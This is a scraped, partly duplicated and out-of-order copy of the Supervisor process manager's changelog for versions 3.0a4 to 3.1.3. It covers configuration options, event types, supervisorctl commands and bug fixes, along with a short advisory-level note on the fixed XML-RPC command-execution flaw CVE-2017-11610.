- Per-process exitcodes= configuration now will not accept exit codes that are not 8-bit unsigned integers (supervisord will not start when one of the exit codes is outside the range of 0 - 255).
- Per-process ``directory`` value can now contain expandable values like ``%(here)s``. (See http://www.plope.com/software/collector/262).
- Accepted patch from Roger Hoover to allow for a new sort of process group: "fcgi-program". Adding one of these to your supervisord.conf allows you to control fastcgi programs. FastCGI programs cannot belong to heterogenous groups.
 The configuration for FastCGI programs is the same as regular programs except an additional "socket" parameter. Substitution happens on the socket parameter with the ``here`` and ``program\_name`` variables::
 [fcgi-program:fcgi\_test] ;socket=tcp://localhost:8002 socket=unix:///path/to/fcgi/socket
- Supervisorctl now supports a plugin model for supervisorctl commands.
- Added the ability to retrieve supervisord's own pid through supervisor.getPID() on the XML-RPC interface or a new "pid" command on supervisorctl.
3.0a6 (2008-04-07)------------------
- The RotatingFileLogger had a race condition in its doRollover method whereby a file might not actually exist despite a call to os.path.exists on the line above a place where we try to remove it. We catch the exception now and ignore the missing file.
3.0a5 (2008-03-13)------------------
- Supervisorctl now supports persistent readline history. To enable, add "history\_file = <pathname>" to the ``[supervisorctl]`` section in your supervisord.conf file.
- Multiple commands may now be issued on one supervisorctl command line, e.g. "restart prog; tail -f prog". Separate commands with a single semicolon; they will be executed in order as you would expect.
3.0a4 (2008-01-30)------------------
- 3.0a3 broke Python 2.3 backwards compatibility.
- On Debian Sarge, one user reported that a call to options.mktempfile would fail with an "[Errno 9] Bad file descriptor" at supervisord startup time. I was unable to reproduce this, but we found a workaround that seemed to work for him and it's included in this release. See http://www.plope.com/software/collector/252 for more information. Thanks to William Dode.
- The fault ``ALREADY\_TERMINATED`` has been removed. It was only raised by supervisor.sendProcessStdin(). That method now returns ``NOT\_RUNNING`` for parity with the other methods. (Mike Naberezny)
- The fault TIMED\_OUT has been removed. It was not used.
- Supervisor now depends on meld3 0.6.4, which does not compile its C extensions by default, so there is no more need to faff around with NO\_MELD3\_EXTENSION\_MODULES during installation if you don't have a C compiler or the Python development libraries on your system.
- Instead of making a user root around for the sample.conf file, provide a convenience command "echo\_supervisord\_conf", which he can use to echo the sample.conf to his terminal (and redirect to a file appropriately). This is a new user convenience (especially one who has no Python experience).
- Added ``numprocs\_start`` config option to ``[program:x]`` and ``[eventlistener:x]`` sections. This is an offset used to compute the first integer that ``numprocs`` will begin to start from. Contributed by Antonio Beamud Montero.
- Added capability for ``[include]`` config section to config format. This section must contain a single key "files", which must name a space-separated list of file globs that will be included in supervisor's configuration. Contributed by Ian Bicking.
- Invoking the ``reload`` supervisorctl command could trigger a bug in supervisord which caused it to crash. See http://www.plope.com/software/collector/253 . Thanks to William Dode for a bug report.
- The ``pidproxy`` script was made into a console script.
- The ``password`` value in both the ``[inet\_http\_server]`` and ``[unix\_http\_server]`` sections can now optionally be specified as a SHA hexdigest instead of as cleartext. Values prefixed with ``{SHA}`` will be considered SHA hex digests. To encrypt a password to a form suitable for pasting into the configuration file using Python, do, e.g.::
 >>> import sha >>> '{SHA}' + sha.new('thepassword').hexdigest() '{SHA}82ab876d1387bfafe46cc1c8a2ef074eae50cb1d'
- The subtypes of the events PROCESS\_STATE\_CHANGE (and PROCESS\_STATE\_CHANGE itself) have been removed, replaced with a simpler set of PROCESS\_STATE subscribable event types.
 The new event types are:
 PROCESS\_STATE\_STOPPED PROCESS\_STATE\_EXITED PROCESS\_STATE\_STARTING PROCESS\_STATE\_STOPPING PROCESS\_STATE\_BACKOFF PROCESS\_STATE\_FATAL PROCESS\_STATE\_RUNNING PROCESS\_STATE\_UNKNOWN PROCESS\_STATE # abstract
 PROCESS\_STATE\_STARTING replaces:
 PROCESS\_STATE\_CHANGE\_STARTING\_FROM\_STOPPED PROCESS\_STATE\_CHANGE\_STARTING\_FROM\_BACKOFF PROCESS\_STATE\_CHANGE\_STARTING\_FROM\_EXITED PROCESS\_STATE\_CHANGE\_STARTING\_FROM\_FATAL
 PROCESS\_STATE\_RUNNING replaces PROCESS\_STATE\_CHANGE\_RUNNING\_FROM\_STARTED
 PROCESS\_STATE\_BACKOFF replaces PROCESS\_STATE\_CHANGE\_BACKOFF\_FROM\_STARTING
 PROCESS\_STATE\_STOPPING replaces:
 PROCESS\_STATE\_CHANGE\_STOPPING\_FROM\_RUNNING PROCESS\_STATE\_CHANGE\_STOPPING\_FROM\_STARTING
 PROCESS\_STATE\_EXITED replaces PROCESS\_STATE\_CHANGE\_EXITED\_FROM\_RUNNING
 PROCESS\_STATE\_STOPPED replaces PROCESS\_STATE\_CHANGE\_STOPPED\_FROM\_STOPPING
 PROCESS\_STATE\_FATAL replaces PROCESS\_STATE\_CHANGE\_FATAL\_FROM\_BACKOFF
 PROCESS\_STATE\_UNKNOWN replaces PROCESS\_STATE\_CHANGE\_TO\_UNKNOWN
 PROCESS\_STATE replaces PROCESS\_STATE\_CHANGE
 The PROCESS\_STATE\_CHANGE\_EXITED\_OR\_STOPPED abstract event is gone.
 All process state changes have at least "processname", "groupname", and "from\_state" (the name of the previous state) in their serializations.
 PROCESS\_STATE\_EXITED additionally has "expected" (1 or 0) and "pid" (the process id) in its serialization.
 PROCESS\_STATE\_RUNNING, PROCESS\_STATE\_STOPPING, PROCESS\_STATE\_STOPPED additionally have "pid" in their serializations.
 PROCESS\_STATE\_STARTING and PROCESS\_STATE\_BACKOFF have "tries" in their serialization (initially "0", bumped +1 each time a start retry happens).
- Remove documentation from README.txt, point people to http://supervisord.org/manual/ .
- The eventlistener request/response protocol has changed. OK/FAIL must now be wrapped in a RESULT envelope so we can use it for more specialized communications.
 Previously, to signify success, an event listener would write the string ``OK\n`` to its stdout. To signify that the event was seen but couldn't be handled by the listener and should be rebuffered, an event listener would write the string ``FAIL\n`` to its stdout.
 In the new protocol, the listener must write the string::
 RESULT {resultlen}\n{result}
 For example, to signify OK::
 RESULT 2\nOK
 To signify FAIL::
 RESULT 4\nFAIL
 See the scripts/sample\_eventlistener.py script for an example.
- To provide a hook point for custom results returned from event handlers (see above) the [eventlistener:x] configuration sections now accept a "result\_handler=" parameter, e.g. "result\_handler=supervisor.dispatchers:default\_handler" (the default) or "handler=mypackage:myhandler". The keys are pkgutil "entry point" specifications (importable Python function names). Result handlers must be callables which accept two arguments: one named "event" which represents the event, and the other named "result", which represents the listener's result. A result handler either executes successfully or raises an exception. If it raises a supervisor.dispatchers.RejectEvent exception, the event will be rebuffered, and the eventhandler will be placed back into the ACKNOWLEDGED state. If it raises any other exception, the event handler will be placed in the UNKNOWN state. If it does not raise any exception, the event is considered successfully processed. A result handler's return value is ignored. Writing a result handler is a "in case of emergency break glass" sort of thing, it is not something to be used for arbitrary business code. In particular, handlers \*must not block\* for any appreciable amount of time.
 The standard eventlistener result handler (supervisor.dispatchers:default\_handler) does nothing if it receives an "OK" and will raise a supervisor.dispatchers.RejectEvent exception if it receives any other value.
- Supervisord now emits TICK events, which happen every N seconds. Three types of TICK events are available: TICK\_5 (every five seconds), TICK\_60 (every minute), TICK\_3600 (every hour). Event listeners may subscribe to one of these types of events to perform every-so-often processing. TICK events are subtypes of the EVENT type.
- Get rid of OSX platform-specific memory monitor and replace with memmon.py, which works on both Linux and Mac OS. This script is now a console script named "memmon".
- Allow "web handler" (the handler which receives http requests from browsers visiting the web UI of supervisor) to deal with POST requests.
- RPC interface methods stopProcess(), stopProcessGroup(), and stopAllProcesses() now take an optional "wait" argument that defaults to True for parity with the start methods.
3.0a3 (2007-10-02)------------------
- Supervisorctl now reports a better error message when the main supervisor XML-RPC namespace is not registered. Thanks to Mike Orr for reporting this. (Mike Naberezny)
- Create ``scripts`` directory within supervisor package, move ``pidproxy.py`` there, and place sample event listener and comm event programs within the directory.
- When an event notification is buffered (either because a listener rejected it or because all listeners were busy when we attempted to send it originally), we now rebuffer it in a way that will result in it being retried earlier than it used to be.
- When a listener process exits (unexpectedly) before transitioning from the BUSY state, rebuffer the event that was being processed.
- supervisorctl ``tail`` command now accepts a trailing specifier: ``stderr`` or ``stdout``, which respectively, allow a user to tail the stderr or stdout of the named process. When this specifier is not provided, tail[View remainder of file in raw view](https://github.com/Supervisor/supervisor/raw/refs/tags/3.3.3/CHANGES.txt)

| [Description](show_bug.cgi?id=1476143#c0)  Andrej Nemec    2017-07-28 06:57:02 UTC  ```   A vulnerability has been found where an authenticated client can send a malicious XML-RPC request to supervisord that will run arbitrary shell commands on the server. The commands will be run as the same user as supervisord. Depending on how supervisord has been configured, this may be root.

- Backported from Supervisor 3.3.3: Fixed CVE-2017-11610. A vulnerability was found where an authenticated client can send a malicious XML-RPC request to ``supervisord`` that will run arbitrary shell commands on the server. The commands will be run as the same user as ``supervisord``. Depending on how ``supervisord`` has been configured, this may be root. See https://github.com/Supervisor/supervisor/issues/964 for details.
3.1.3 (2014-10-28)------------------
- Fixed an XML-RPC bug where the ElementTree-based parser handled strings like ``<value><string>hello</string></value>`` but not strings like ``<value>hello</value>``, which are valid in the XML-RPC spec. This fixes compatibility with the Apache XML-RPC client for Java and possibly other clients.
3.1.2 (2014-09-07)------------------
- Fixed a bug where ``tail group:\*`` in ``supervisorctl`` would show a 500 Internal Server Error rather than a BAD\_NAME fault.
- Fixed a bug where the web interface would show a 500 Internal Server Error instead of an error message for some process start faults.
- Removed medusa files not used by Supervisor.
3.1.1 (2014-08-11)------------------
- Fixed a bug where ``supervisorctl tail -f name`` output would stop if log rotation occurred while tailing.
- Prevent a crash when a greater number file descriptors were attempted to be opened than permitted by the environment when starting a bunch of programs. Now, instead a spawn error is logged.
- Compute "channel delay" properly, fixing symptoms where a supervisorctl start command would hang for a very long time when a process (or many processes) are spewing to their stdout or stderr. See comments attached to https://github.com/Supervisor/supervisor/pull/263 .
- Added docs/conf.py, docs/Makefile, and supervisor/scripts/\*.py to the release package.
3.1.0 (2014-07-29)------------------
- The output of the ``start``, ``stop``, ``restart``, and ``clear`` commands in ``supervisorctl`` has been changed to be consistent with the ``status`` command. Previously, the ``status`` command would show a process like ``foo:foo\_01`` but starting that process would show ``foo\_01: started`` (note the group prefix ``foo:`` was missing). Now, starting the process will show ``foo:foo\_01: started``. Suggested by Chris Wood.
- The ``status`` command in ``supervisorctl`` now supports group name syntax: ``status group:\*``.
- The process column in the table output by the ``status`` command in ``supervisorctl`` now expands to fit the widest name.
- The ``update`` command in ``supervisorctl`` now accepts optional group names. When group names are specified, only those groups will be updated. Patch by Gary M. Josack.
- Tab completion in ``supervisorctl`` has been improved and now works for more cases. Thanks to Mathieu Longtin and Marc Abramowitz for the patches.
- Attempting to start or stop a process group in ``supervisorctl`` with the ``group:\*`` syntax will now show the same error message as the ``process`` syntax if the name does not exist. Previously, it would show a Python exception. Patch by George Ang.
- Added new ``PROCESS\_GROUP\_ADDED`` and ``PROCESS\_GROUP\_REMOVED`` events. These events are fired when process groups are added or removed from Supervisor's runtime configuration when using the ``add`` and ``remove`` commands in ``supervisorctl``. Patch by Brent Tubbs.
- Stopping a process in the backoff state now changes it to the stopped state. Previously, an attempt to stop a process in backoff would be ignored. Patch by Pascal Varet.
- The ``directory`` option is now expanded separately for each process in a homogeneous process group. This allows each process to have its own working directory. Patch by Perttu Ranta-aho.
- Removed ``setuptools`` from the ``requires`` list in ``setup.py`` because it caused installation issues on some systems.
- Fixed a bug in Medusa where the HTTP Basic authorizer would cause an exception if the password contained a colon. Thanks to Thomas Guttler for reporting this issue.
- Fixed an XML-RPC bug where calling supervisor.clearProcessLogs() with a name like ``group:\*`` would cause a 500 Internal Server Error rather than returning a BAD\_NAME fault.
- Fixed a hang that could occur in ``supervisord`` if log rotation is used and an outside program deletes an active log file. Patch by Magnus Lycka.
- A warning is now logged if a glob pattern in an ``[include]`` section does not match any files. Patch by Daniel Hahler.
3.0.1 (2017-07-24)------------------
- Backported from Supervisor 3.3.3: Fixed CVE-2017-11610. A vulnerability was found where an authenticated client can send a malicious XML-RPC request to ``supervisord`` that will run arbitrary shell commands on the server. The commands will be run as the same user as ``supervisord``. Depending on how ``supervisord`` has been configured, this may be root. See https://github.com/Supervisor/supervisor/issues/964 for details.
3.0 (2013-07-30)----------------
- Parsing the config file will now fail with an error message if a process or group name contains characters that are not compatible with the eventlistener protocol.
- Fixed a bug where the ``tail -f`` command in ``supervisorctl`` would fail if the combined length of the username and password was over 56 characters.
- Reading the config file now gives a separate error message when the config file exists but can't be read. Previously, any error reading the file would be reported as "could not find config file". Patch by Jens Rantil.
- Fixed an XML-RPC bug where array elements after the first would be ignored when using the ElementTree-based XML parser. Patch by Zev Benjamin.
- Fixed the usage message output by ``supervisorctl`` to show the correct default config file path. Patch by Alek Storm.
3.0b2 (2013-05-28)------------------
- The behavior of the program option ``user`` has changed. In all previous versions, if ``supervisord`` failed to switch to the user, a warning would be sent to the stderr log but the child process would still be spawned. This means that a mistake in the config file could result in a child process being unintentionally spawned as root. Now, ``supervisord`` will not spawn the child unless it was able to successfully switch to the user. Thanks to Igor Partola for reporting this issue.
- If a user specified in the config file does not exist on the system, ``supervisord`` will now print an error and refuse to start.
- Reverted a change to logging introduced in 3.0b1 that was intended to allow multiple processes to log to the same file with the rotating log handler. The implementation caused supervisord to crash during reload and to leak file handles. Also, since log rotation options are given on a per-program basis, impossible configurations could be created (conflicting rotation options for the same file). Given this and that supervisord now has syslog support, it was decided to remove this feature. A warning was added to the documentation that two processes may not log to the same file.
- Fixed a bug where parsing ``command=`` could cause supervisord to crash if shlex.split() fails, such as a bad quoting. Patch by Scott Wilson.
- It is now possible to use ``supervisorctl`` on a machine with no ``supervisord.conf`` file by supplying the connection information in command line options. Patch by Jens Rantil.
- Fixed a bug where supervisord would crash if the syslog handler was used and supervisord received SIGUSR2 (log reopen request).
- Fixed an XML-RPC bug where calling supervisor.getProcessInfo() with a bad name would cause a 500 Internal Server Error rather than the returning a BAD\_NAME fault.
- Added a favicon to the web interface. Patch by Caio Ariede.
- Fixed a test failure due to incorrect handling of daylight savings time in the childutils tests. Patch by Ildar Hizbulin.
- Fixed a number of pyflakes warnings for unused variables, imports, and dead code. Patch by Philippe Ombredanne.
3.0b1 (2012-09-10)------------------
- Fixed a bug where parsing ``environment=`` did not verify that key/value pairs were correctly separated. Patch by Martijn Pieters.
- Fixed a bug in the HTTP server code that could cause unnecessary delays when sending large responses. Patch by Philip Zeyliger.
- When supervisord starts up as root, if the ``-c`` flag was not provided, a warning is now emitted to the console. Rationale: supervisord looks in the current working directory for a ``supervisord.conf`` file; someone might trick the root user into starting supervisord while cd'ed into a directory that has a rogue ``supervisord.conf``.
- A warning was added to the documentation about the security implications of starting supervisord without the ``-c`` flag.
- Add a boolean program option ``stopasgroup``, defaulting to false. When true, the flag causes supervisor to send the stop signal to the whole process group. This is useful for programs, such as Flask in debug mode, that do not propagate stop signals to their children, leaving them orphaned.
- Python 2.3 is no longer supported. The last version that supported Python 2.3 is Supervisor 3.0a12.
- Removed the unused "supervisor\_rpc" entry point from setup.py.
- Fixed a bug in the rotating log handler that would cause unexpected results when two processes were set to log to the same file. Patch by Whit Morriss.
- Fixed a bug in config file reloading where each reload could leak memory because a list of warning messages would be appended but never cleared. Patch by Philip Zeyliger.
- Added a new Syslog log handler. Thanks to Denis Bilenko, Nathan L. Smith, and Jason R. Coombs, who each contributed to the patch.
- Put all change history into a single file (CHANGES.txt).
3.0a12 (2011-12-06)-------------------
- Released to replace a broken 3.0a11 package where non-Python files were not included in the package.
3.0a11 (2011-12-06)-------------------
- Added a new file, ``PLUGINS.rst``, with a listing of third-party plugins for Supervisor. Contributed by Jens Rantil.
- The ``pid`` command in supervisorctl can now be used to retrieve the PIDs of child processes. See ``help pid``. Patch by Gregory Wisniewski.
- Added a new ``host\_node\_name`` expansion that will be expanded to the value returned by Python's ``platform.node`` (see http://docs.python.org/library/platform.html#platform.node). Patch by Joseph Kondel.
- Fixed a bug in the web interface where pages over 64K would be truncated. Thanks to Drew Perttula and Timothy Jones for reporting this.
- Renamed ``README.txt`` to ``README.rst`` so GitHub renders the file as ReStructuredText.
- The XML-RPC server is now compatible with clients that do not send empty <params> when there are no parameters for the method call. Thanks to Johannes Becker for reporting this.
- Fixed ``supervisorctl --help`` output to show the correct program name.
- The behavior of the configuration options ``minfds`` and ``minprocs`` has changed. Previously, if a hard limit was less than ``minfds`` or ``minprocs``, supervisord would unconditionally abort with an error. Now, supervisord will attempt to raise the hard limit. This may succeed if supervisord is run as root, otherwise the error is printed as before. Patch by Benoit Sigoure.
- Add a boolean program option ``killasgroup``, defaulting to false, if true when resorting to send SIGKILL to stop/terminate the process send it to its whole process group instead to take care of possible children as well and not leave them behind. Patch by Samuele Pedroni.
- Environment variables may now be used in the configuration file for options that support string expansion. Patch by Aleksey Sivokon.
- Fixed a race condition where supervisord might not act on a signal sent to it. Thanks to Adar Dembo for reporting the issue and supplying the initial patch.
- Updated the output of ``echo\_supervisord\_conf`` to fix typos and improve comments. Thanks to Jens Rantil for noticing these.
- Fixed a possible 500 Server Error from the web interface. This was observed when using Supervisor on a domain socket behind Nginx, where Supervisor would raise an exception because REMOTE\_ADDR was not set. Patch by David Bennett.
3.0a10 (2011-03-30)-------------------
- Fixed the stylesheet of the web interface so the footer line won't overlap a long process list. Thanks to Derek DeVries for the patch.
- Allow rpc interface plugins to register new events types.
- Bug fix for FCGI sockets not getting cleaned up when the ``reload`` command is issued from supervisorctl. Also, the default behavior has changed for FCGI sockets. They are now closed whenever the number of running processes in a group hits zero. Previously, the sockets were kept open unless a group-level stop command was issued.
- Better error message when HTTP server cannot reverse-resolve a hostname to an IP address. Previous behavior: show a socket error. Current behavior: spit out a suggestion to stdout.
- Environment variables set via ``environment=`` value within ``[supervisord]`` section had no effect. Thanks to Wyatt Baldwin for a patch.
- Fix bug where stopping process would cause process output that happened after the stop request was issued to be lost. See https://github.com/Supervisor/supervisor/issues/11.
- Moved 2.X change log entries into ``HISTORY.txt``.
- Converted ``CHANGES.txt`` and ``README.txt`` into proper ReStructuredText and included them in the ``long\_description`` in ``setup.py``.
- Added a tox.ini to the package (run via ``tox`` in the package dir). Tests supervisor on multiple Python versions.
3.0a9 (2010-08-13)------------------
- Use rich comparison methods rather than \_\_cmp\_\_ to sort process configs and process group configs to better straddle Python versions. (thanks to Jonathan Riboux for identifying the problem and supplying an initial patch).
- Fixed test\_supervisorctl.test\_maintail\_dashf test for Python 2.7. (thanks to Jonathan Riboux for identifying the problem and supplying an initial patch).
- Fixed the way that supervisor.datatypes.url computes a "good" URL for compatibility with Python 2.7 and Python >= 2.6.5. URLs with bogus "schemes://" will now be accepted as a version-straddling compromise (before they were rejected before supervisor would start). (thanks to Jonathan Riboux for identifying the problem and supplying an initial patch).
- Add a ``-v`` / ``--version`` option to supervisord: Print the supervisord version number out to stdout and exit. (Roger Hoover)
- Import iterparse from xml.etree when available (eg: Python 2.6). Patch by Sidnei da Silva.
- Fixed the url to the supervisor-users mailing list. Patch by Sidnei da Silva
- When parsing "environment=" in the config file, changes introduced in 3.0a8 prevented Supervisor from parsing some characters commonly found in paths unless quoting was used as in this example::
 environment=HOME='/home/auser'
 Supervisor once again allows the above line to be written as::
 environment=HOME=/home/auser
 Alphanumeric characters, "\_", "/", ".", "+", "-", "(", ")", and ":" can all be used as a value without quoting. If any other characters are needed in the value, please quote it as in the first example above. Thanks to Paul Heideman for reporting this issue.
- Supervisor will now look for its config file in locations relative to the executable path, allowing it to be used more easily in virtual environments. If sys.argv[0] is ``/path/to/venv/bin/supervisorctl``, supervisor will now look for it's config file in ``/path/to/venv/etc/supervisord.conf`` and ``/path/to/venv/supervisord.conf`` in addition to the other standard locations. Patch by Chris Rossi.
3.0a8 (2010-01-20)------------------
- Don't cleanup file descriptors on first supervisord invocation: this is a lame workaround for Snow Leopard systems that use libdispatch and are receiving "Illegal instruction" messages at supervisord startup time. Restarting supervisord via "supervisorctl restart" may still cause a crash on these systems.
- Got rid of Medusa hashbang headers in various files to ease RPM packaging.
- Allow umask to be 000 (patch contributed by Rowan Nairn).
- Fixed a bug introduced in 3.0a7 where supervisorctl wouldn't ask for a username/password combination properly from a password-protected supervisord if it wasn't filled in within the "[supervisorctl]" section username/password values. It now properly asks for a username and password.
- Fixed a bug introduced in 3.0a7 where setup.py would not detect the Python version correctly. Patch by Daniele Paolella.
- Fixed a bug introduced in 3.0a7 where parsing a string of key/value pairs failed on Python 2.3 due to use of regular expression syntax introduced in Python 2.4.
- Removed the test suite for the ``memmon`` console script, which was moved to the Superlance package in 3.0a7.
- Added release dates to CHANGES.txt.
- Reloading the config for an fcgi process group did not close the fcgi socket - now, the socket is closed whenever the group is stopped as a unit (including during config update). However, if you stop all the processes in a group individually, the socket will remain open to allow for graceful restarts of FCGI daemons. (Roger Hoover)
- Rereading the config did not pick up changes to the socket parameter in a fcgi-program section. (Roger Hoover)
- Made a more friendly exception message when a FCGI socket cannot be created. (Roger Hoover)
- Fixed a bug where the --serverurl option of supervisorctl would not accept a URL with a "unix" scheme. (Jason Kirtland)
- Running the tests now requires the "mock" package. This dependency has been added to "tests\_require" in setup.py. (Roger Hoover)
- Added support for setting the ownership and permissions for an FCGI socket. This is done using new "socket\_owner" and "socket\_mode" options in an [fcgi-program:x] section. See the manual for details. (Roger Hoover)
- Fixed a bug where the FCGI socket reference count was not getting decremented on spawn error. (Roger Hoover)
- Fixed a Python 2.6 deprecation warning on use of the "sha" module.
- Updated ez\_setup.py to one that knows about setuptools 0.6c11.
- Running "supervisorctl shutdown" no longer dumps a Python backtrace when it can't connect to supervisord on the expected socket. Thanks to Benjamin Smith for reporting this.
- Removed use of collections.deque in our bundled version of asynchat because it broke compatibility with Python 2.3.
- The sample configuration output by "echo\_supervisord\_conf" now correctly shows the default for "autorestart" as "unexpected". Thanks to William Dode for noticing it showed the wrong value.
3.0a7 (2009-05-24)------------------
- We now bundle our own patched version of Medusa contributed by Jason Kirtland to allow Supervisor to run on Python 2.6. This was done because Python 2.6 introduced backwards incompatible changes to asyncore and asynchat in the stdlib.
- The console script ``memmon``, introduced in Supervisor 3.0a4, has been moved to Superlance (http://pypi.python.org/pypi/superlance). The Superlance package contains other useful monitoring tools designed to run under Supervisor.
- Supervisorctl now correctly interprets all of the error codes that can be returned when starting a process. Patch by Francesc Alted.
- New ``stdout\_events\_enabled`` and ``stderr\_events\_enabled`` config options have been added to the ``[program:x]``, ``[fcgi-program:x]``, and ``[eventlistener:x]`` sections. These enable the emitting of new PROCESS\_LOG events for a program. If unspecified, the default is False.
 If enabled for a subprocess, and data is received from the stdout or stderr of the subprocess while not in the special capture mode used by PROCESS\_COMMUNICATION, an event will be emitted.
 Event listeners can subscribe to either PROCESS\_LOG\_STDOUT or PROCESS\_LOG\_STDERR individually, or PROCESS\_LOG for both.
- Values for subprocess environment variables specified with environment= in supervisord.conf can now be optionally quoted, allowing them to contain commas. Patch by Tim Godfrey.
- Added a new event type, REMOTE\_COMMUNICATION, that is emitted by a new RPC method, supervisor.sendRemoteCommEvent().
- Patch for bug #268 (KeyError on ``here`` expansion for stdout/stderr\_logfile) from David E. Kindred.
- Add ``reread``, ``update``, and ``avail`` commands based on Anders Quist's ``online\_config\_reload.diff`` patch. This patch extends the "add" and "drop" commands with automagical behavior::
 In supervisorctl:
 supervisor> status bar RUNNING pid 14864, uptime 18:03:42 baz RUNNING pid 23260, uptime 0:10:16 foo RUNNING pid 14866, uptime 18:03:42 gazonk RUNNING pid 23261, uptime 0:10:16 supervisor> avail bar in use auto 999:999 baz in use auto 999:999 foo in use auto 999:999 gazonk in use auto 999:999 quux avail auto 999:999
 Now we add this to our conf:
 [group:zegroup] programs=baz,gazonk
 Then we reread conf:
 supervisor> reread baz: disappeared gazonk: disappeared quux: available zegroup: available supervisor> avail bar in use auto 999:999 foo in use auto 999:999 quux avail auto 999:999 zegroup:baz avail auto 999:999 zegroup:gazonk avail auto 999:999 supervisor> status bar RUNNING pid 14864, uptime 18:04:18 baz RUNNING pid 23260, uptime 0:10:52 foo RUNNING pid 14866, uptime 18:04:18 gazonk RUNNING pid 23261, uptime 0:10:52
 The magic make-it-so command:
 supervisor> update baz: stopped baz: removed process group gazonk: stopped gazonk: removed process group zegroup: added process group quux: added process group supervisor> status bar RUNNING pid 14864, uptime 18:04:43 foo RUNNING pid 14866, uptime 18:04:43 quux RUNNING pid 23561, uptime 0:00:02 zegroup:baz RUNNING pid 23559, uptime 0:00:02 zegroup:gazonk RUNNING pid 23560, uptime 0:00:02 supervisor> avail bar in use auto 999:999 foo in use auto 999:999 quux in use auto 999:999 zegroup:baz in use auto 999:999 zegroup:gazonk in use auto 999:999
- Fix bug with symptom "KeyError: 'process\_name'" when using a logfile name including documented``process\_name`` Python string expansions.
- Tab completions in the supervisorctl shell, and a foreground mode for Supervisor, implemented as a part of GSoC. The supervisorctl program now has a ``fg`` command, which makes it possible to supply inputs to a process, and see its output/error stream in real time.
- Process config reloading implemented by Anders Quist. The supervisorctl program now has the commands "add" and "drop". "add <programname>" adds the process group implied by <programname> in the config file. "drop <programname>" removes the process group from the running configuration (it must already be stopped). This makes it possible to add processes to and remove processes from a running supervisord without restarting the supervisord process.
- Fixed a bug where opening the HTTP servers would fail silently for socket errors other than errno.EADDRINUSE.
- Thanks to Dave Peticolas, using "reload" against a supervisord that is running in the background no longer causes supervisord to crash.
- Configuration options for logfiles now accept mixed case reserved words (e.g. "AUTO" or "auto") for consistency with other options.
- childutils.eventdata was buggy, it could not deal with carriage returns in data. See http://www.plope.com/software/collector/257. Thanks to Ian Bicking.
- Per-process exitcodes= configuration now will not accept exit codes that are not 8-bit unsigned integers (supervisord will not start when one of the exit codes is outside the range of 0 - 255).
- Per-process ``directory`` value can now contain expandable values like ``%(here)s``. (See http://www.plope.com/software/collector/262).
- Accepted patch from Roger Hoover to allow for a new sort of process group: "fcgi-program". Adding one of these to your supervisord.conf allows you to control fastcgi programs. FastCGI programs cannot belong to heterogenous groups.
 The configuration for FastCGI programs is the same as regular programs except an additional "socket" parameter. Substitution happens on the socket parameter with the ``here`` and ``program\_name`` variables::
 [fcgi-program:fcgi\_test] ;socket=tcp://localhost:8002 socket=unix:///path/to/fcgi/socket
- Supervisorctl now supports a plugin model for supervisorctl commands.
- Added the ability to retrieve supervisord's own pid through supervisor.getPID() on the XML-RPC interface or a new "pid" command on supervisorctl.
3.0a6 (2008-04-07)------------------
- The RotatingFileLogger had a race condition in its doRollover method whereby a file might not actually exist despite a call to os.path.exists on the line above a place where we try to remove it. We catch the exception now and ignore the missing file.
3.0a5 (2008-03-13)------------------
- Supervisorctl now supports persistent readline history. To enable, add "history\_file = <pathname>" to the ``[supervisorctl]`` section in your supervisord.conf file.
- Multiple commands may now be issued on one supervisorctl command line, e.g. "restart prog; tail -f prog". Separate commands with a single semicolon; they will be executed in order as you would expect.
3.0a4 (2008-01-30)------------------
- 3.0a3 broke Python 2.3 backwards compatibility.
- On Debian Sarge, one user reported that a call to options.mktempfile would fail with an "[Errno 9] Bad file descriptor" at supervisord startup time. I was unable to reproduce this, but we found a workaround that seemed to work for him and it's included in this release. See http://www.plope.com/software/collector/252 for more information. Thanks to William Dode.
- The fault ``ALREADY\_TERMINATED`` has been removed. It was only raised by supervisor.sendProcessStdin(). That method now returns ``NOT\_RUNNING`` for parity with the other methods. (Mike Naberezny)
- The fault TIMED\_OUT has been removed. It was not used.
- Supervisor now depends on meld3 0.6.4, which does not compile its C extensions by default, so there is no more need to faff around with NO\_MELD3\_EXTENSION\_MODULES during installation if you don't have a C compiler or the Python development libraries on your system.
- Instead of making a user root around for the sample.conf file, provide a convenience command "echo\_supervisord\_conf", which he can use to echo the sample.conf to his terminal (and redirect to a file appropriately). This is a new user convenience (especially one who has no Python experience).
- Added ``numprocs\_start`` config option to ``[program:x]`` and ``[eventlistener:x]`` sections. This is an offset used to compute the first integer that ``numprocs`` will begin to start from. Contributed by Antonio Beamud Montero.
- Added capability for ``[include]`` config section to config format. This section must contain a single key "files", which must name a space-separated list of file globs that will be included in supervisor's configuration. Contributed by Ian Bicking.
- Invoking the ``reload`` supervisorctl command could trigger a bug in supervisord which caused it to crash. See http://www.plope.com/software/collector/253 . Thanks to William Dode for a bug report.
- The ``pidproxy`` script was made into a console script.
- The ``password`` value in both the ``[inet\_http\_server]`` and ``[unix\_http\_server]`` sections can now optionally be specified as a SHA hexdigest instead of as cleartext. Values prefixed with ``{SHA}`` will be considered SHA hex digests. To encrypt a password to a form suitable for pasting into the configuration file using Python, do, e.g.::
 >>> import sha >>> '{SHA}' + sha.new('thepassword').hexdigest() '{SHA}82ab876d1387bfafe46cc1c8a2ef074eae50cb1d'
- The subtypes of the events PROCESS\_STATE\_CHANGE (and PROCESS\_STATE\_CHANGE itself) have been removed, replaced with a simpler set of PROCESS\_STATE subscribable event types.
 The new event types are:
 PROCESS\_STATE\_STOPPED PROCESS\_STATE\_EXITED PROCESS\_STATE\_STARTING PROCESS\_STATE\_STOPPING PROCESS\_STATE\_BACKOFF PROCESS\_STATE\_FATAL PROCESS\_STATE\_RUNNING PROCESS\_STATE\_UNKNOWN PROCESS\_STATE # abstract
 PROCESS\_STATE\_STARTING replaces:
 PROCESS\_STATE\_CHANGE\_STARTING\_FROM\_STOPPED PROCESS\_STATE\_CHANGE\_STARTING\_FROM\_BACKOFF PROCESS\_STATE\_CHANGE\_STARTING\_FROM\_EXITED PROCESS\_STATE\_CHANGE\_STARTING\_FROM\_FATAL
 PROCESS\_STATE\_RUNNING replaces PROCESS\_STATE\_CHANGE\_RUNNING\_FROM\_STARTED
 PROCESS\_STATE\_BACKOFF replaces PROCESS\_STATE\_CHANGE\_BACKOFF\_FROM\_STARTING
 PROCESS\_STATE\_STOPPING replaces:
 PROCESS\_STATE\_CHANGE\_STOPPING\_FROM\_RUNNING PROCESS\_STATE\_CHANGE\_STOPPING\_FROM\_STARTING
